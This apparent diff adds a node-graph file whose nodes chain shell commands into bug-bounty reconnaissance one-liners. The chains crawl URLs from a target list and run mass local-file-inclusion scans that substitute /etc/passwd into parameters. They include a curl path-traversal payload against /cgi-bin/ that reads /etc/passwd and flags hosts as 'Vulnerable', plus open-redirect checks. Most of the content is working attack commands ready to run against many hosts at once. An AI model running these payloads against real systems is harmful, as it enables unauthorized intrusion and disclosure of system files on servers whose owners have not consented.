@@ -1,0 +1,176 @@
+[_GraphNode_511]
+
+name=&"_GraphNode_511"
+offset_x=-380.0
+offset_y=-180.0
+size_x=363.981
+size_y=204.0
+text="<gau/katana/hakrawler/waybackurls>"
+separator=" | "
+connections="{\"0\":[{\"from\":\"_GraphNode_511\",\"from_port\":0,\"to\":\"_GraphNode_525\",\"to_port\":0}]}"
+
+[_GraphNode_623]
+
+name=&"_GraphNode_623"
+offset_x=380.0
+offset_y=520.0
+size_x=363.998
+size_y=204.0
+text="do curl --silent --path-as-is --insecure \"$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\""
+separator=" ; "
+connections="{\"0\":[{\"from\":\"_GraphNode_623\",\"from_port\":0,\"to\":\"_GraphNode_637\",\"to_port\":0}]}"
+
+[_GraphNode_637]
+
+name=&"_GraphNode_637"
+offset_x=960.0
+offset_y=720.0
+size_x=364.0
+size_y=204.0
+text="grep \"root:*\" && echo \"$host \\033[0;31mVulnerable\\n\""
+separator=" ; "
+connections="{\"0\":[{\"from\":\"_GraphNode_637\",\"from_port\":0,\"to\":\"_GraphNode_651\",\"to_port\":0}]}"
+
+[_GraphNode_651]
+
+name=&"_GraphNode_651"
+offset_x=1600.0
+offset_y=440.0
+size_x=364.0
+size_y=204.0
+text="done"
+separator=" ; "
+connections="{}"
+
+[_GraphNode_697]
+
+name=&"_GraphNode_697"
+offset_x=560.0
+offset_y=1060.0
+size_x=364.0
+size_y=203.999
+text="gf redirect"
+separator=" | "
+connections="{\"0\":[{\"from\":\"_GraphNode_697\",\"from_port\":0,\"to\":\"_GraphNode_711\",\"to_port\":0}]}"
+
+[_GraphNode_711]
+
+name=&"_GraphNode_711"
+offset_x=1240.0
+offset_y=1260.0
+size_x=364.0
+size_y=204.001
+text="qsreplace 'http://example.com'"
+separator=" | "
+connections="{\"0\":[{\"from\":\"_GraphNode_711\",\"from_port\":0,\"to\":\"_GraphNode_725\",\"to_port\":0}]}"
+
+[_GraphNode_725]
+
+name=&"_GraphNode_725"
+offset_x=1760.0
+offset_y=960.0
+size_x=364.0
+size_y=204.0
+text="httpx -fr -title -match-string 'Example Domain'"
+separator=" ; "
+connections="{}"
+
+[GraphNode]
+
+name=&"GraphNode"
+offset_x=-960.0
+offset_y=160.0
+size_x=363.999
+size_y=204.0
+text="cat targets.txt"
+separator=" ; "
+connections="{\"0\":[{\"from\":\"GraphNode\",\"from_port\":0,\"to\":\"_GraphNode_511\",\"to_port\":0},{\"from\":\"GraphNode\",\"from_port\":0,\"to\":\"_GraphNode_609\",\"to_port\":0},{\"from\":\"GraphNode\",\"from_port\":0,\"to\":\"_GraphNode_683\",\"to_port\":0}]}"
+
+[_GraphNode_683]
+
+name=&"_GraphNode_683"
+offset_x=-180.0
+offset_y=840.0
+size_x=364.015
+size_y=204.0
+text="waybackurls "
+separator=" | "
+connections="{\"0\":[{\"from\":\"_GraphNode_683\",\"from_port\":0,\"to\":\"_GraphNode_697\",\"to_port\":0}]}"
+
+[_GraphNode_661]
+
+name=&"_GraphNode_661"
+offset_x=-1460.0
+offset_y=-220.0
+size_x=363.987
+size_y=204.0
+text="echo \"Start\""
+separator=" ; "
+connections="{\"0\":[{\"from\":\"_GraphNode_661\",\"from_port\":0,\"to\":\"GraphNode\",\"to_port\":0}]}"
+
+[_GraphNode_525]
+
+name=&"_GraphNode_525"
+offset_x=220.0
+offset_y=-320.0
+size_x=364.002
+size_y=204.0
+text="gf lfi"
+separator=" | "
+connections="{\"0\":[{\"from\":\"_GraphNode_525\",\"from_port\":0,\"to\":\"_GraphNode_539\",\"to_port\":0},{\"from\":\"_GraphNode_525\",\"from_port\":0,\"to\":\"_GraphNode_567\",\"to_port\":0}]}"
+
+[_GraphNode_567]
+
+name=&"_GraphNode_567"
+offset_x=780.0
+offset_y=60.0
+size_x=364.0
+size_y=204.0
+text="qsreplace \"/etc/passwd\""
+separator=" | "
+connections="{\"0\":[{\"from\":\"_GraphNode_567\",\"from_port\":0,\"to\":\"_GraphNode_581\",\"to_port\":0}]}"
+
+[_GraphNode_581]
+
+name=&"_GraphNode_581"
+offset_x=1340.0
+offset_y=-80.0
+size_x=364.0
+size_y=204.0
+text="xargs -I% -P 25 sh -c 'curl -s \"%\" 2>&1"
+separator=" | "
+connections="{\"0\":[{\"from\":\"_GraphNode_581\",\"from_port\":0,\"to\":\"_GraphNode_595\",\"to_port\":0}]}"
+
+[_GraphNode_595]
+
+name=&"_GraphNode_595"
+offset_x=1840.0
+offset_y=-380.0
+size_x=363.999
+size_y=204.0
+text="grep -q \"root:x\" && echo \"VULN! %\"'"
+separator=" ; "
+connections="{}"
+
+[_GraphNode_609]
+
+name=&"_GraphNode_609"
+offset_x=-240.0
+offset_y=300.0
+size_x=364.014
+size_y=204.0
+text="while read host do"
+separator=" ; "
+connections="{\"0\":[{\"from\":\"_GraphNode_609\",\"from_port\":0,\"to\":\"_GraphNode_623\",\"to_port\":0}]}"
+
+[_GraphNode_539]
+
+name=&"_GraphNode_539"
+offset_x=960.0
+offset_y=-620.0
+size_x=486.974
+size_y=283.572
+text="httpx -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code -follow-redirects -mc 200 -mr \"root:[x*]:0:0:\"
+"
+separator=" ; "
+connections="{}"
